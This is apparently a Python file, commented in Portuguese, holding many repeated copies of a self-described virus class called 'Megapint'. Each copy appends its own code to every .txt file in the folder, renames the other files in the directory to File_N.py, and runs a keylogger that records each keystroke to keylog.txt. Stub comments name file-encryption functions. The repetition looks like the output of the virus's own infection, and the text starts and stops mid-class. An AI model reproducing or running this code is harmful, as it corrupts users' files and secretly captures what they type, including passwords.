    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
